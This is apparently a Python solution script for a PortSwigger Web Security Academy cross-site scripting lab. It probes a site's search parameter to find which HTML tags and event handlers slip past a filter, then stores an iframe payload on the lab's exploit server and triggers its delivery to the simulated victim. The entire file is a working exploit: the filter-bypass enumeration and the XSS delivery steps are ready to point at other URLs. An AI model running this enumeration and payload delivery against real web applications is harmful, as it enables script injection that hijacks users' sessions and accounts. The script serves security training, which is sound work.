import requests
import re
import sys

def read_lines(file_path):
    with open(file_path, 'r') as file:
        lines = file.read().splitlines()
    return lines

def main(url):
    tags_file = '../Portswigger_lists/tags.txt'
    events_file = '../Portswigger_lists/events.txt'

    tags = read_lines(tags_file)
    events = read_lines(events_file)

    burp_headers = {}
    burp_cookies = {}

    valid_tag_event_pairs = []

    for tag in tags:
        burp_url = f"{url}/?search=<{tag}>"
        response = requests.get(burp_url, headers=burp_headers, cookies=burp_cookies)

        if "Tag is not allowed" not in response.text:
            print(f"Tag '{tag}' is allowed.")

            for event in events:
                burp_url = f"{url}/?search=<{tag} {event}=1>"
                response = requests.get(burp_url, headers=burp_headers, cookies=burp_cookies)

                if "Attribute is not allowed" not in response.text:
                    print(f"Event '{event}' is allowed for tag '{tag}'.")
                    valid_tag_event_pairs.append((tag, event))

    if not valid_tag_event_pairs:
        print("No valid tag-event pairs found.")
        return

    response = requests.get(url, headers=burp_headers, cookies=burp_cookies)
    match = re.search(r"<a id='exploit-link' class='button' target='_blank' href='(https://exploit-[0-9a-f]+\.exploit-server\.net)'>", response.text)

    if match:
        exploit_server = match.group(1)
        print(f"Exploit server found: {exploit_server}")

        for tag, event in valid_tag_event_pairs:
            post_data = {
                'urlIsHttps': 'on',
                'responseFile': '/exploit',
                'responseHead': 'HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8',
                'responseBody': f'<iframe src="{url}/?search=%22><{tag} {event}=print()>" onload=this.style.width=\'100px\'>',
                'formAction': 'STORE'
            }
            post_response = requests.post(f"{exploit_server}/", data=post_data, headers=burp_headers, cookies=burp_cookies)

            if post_response.status_code == 200:
                print(f"POST request to exploit server was successful for tag '{tag}' and event '{event}'.")

                last_step = f"{exploit_server}/deliver-to-victim"
                burp0_headers = {}
                final_response = requests.get(last_step, headers=burp0_headers)
                print(last_step)

                if final_response.status_code == 200:
                    print("GET request to /deliver-to-victim was successful.")
                else:
                    print("GET request to /deliver-to-victim failed.")
            else:
                print(f"POST request to exploit server failed for tag '{tag}' and event '{event}'.")
    else:
        print("Exploit server link not found on the main page.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    main(url)
